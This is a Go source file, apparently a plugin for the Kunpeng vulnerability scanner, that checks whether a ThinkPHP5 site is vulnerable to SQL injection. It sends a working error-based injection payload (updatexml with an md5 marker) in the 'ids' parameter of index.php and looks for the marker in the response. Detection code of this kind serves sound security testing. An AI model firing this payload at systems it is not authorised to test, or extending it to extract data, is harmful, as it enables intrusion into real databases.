package goplugin

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type thinkphp5SQLIResult struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("thinkphp", &thinkphp5SQLIResult{})
}

func (d *thinkphp5SQLIResult) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "ThinkPHP5 SQL Injection Vulnerability",
		Remarks: "ThinkPHP5 SQL Injection Vulnerability in index.php?ids && Sensitive Information Disclosure Vulnerability",
		Level:   1,
		Type:    "SQLI",
		Author:  "neargle",
		References: plugin.References{
			URL:  "https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html",
			KPID: "KP-0032",
		},
	}
	return d.info
}

func (d *thinkphp5SQLIResult) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}

func (d *thinkphp5SQLIResult) Check(URL string, meta plugin.TaskMeta) bool {
	randomBs := util.GetRandomBytes(6)
	randomStr := string(randomBs)
	md5Str := util.GetMd5(randomBs)
	payload := fmt.Sprintf("/index.php?ids[0,updatexml(0,concat(0xa,md5(%%27%s%%27)),0)]=1", randomStr)
	url := URL + payload
	request, err := http.NewRequest("GET", url, nil)
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	// thinkphp will cut mysql's error message in response
	if strings.Contains(resp.ResponseRaw, md5Str[:10]) {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
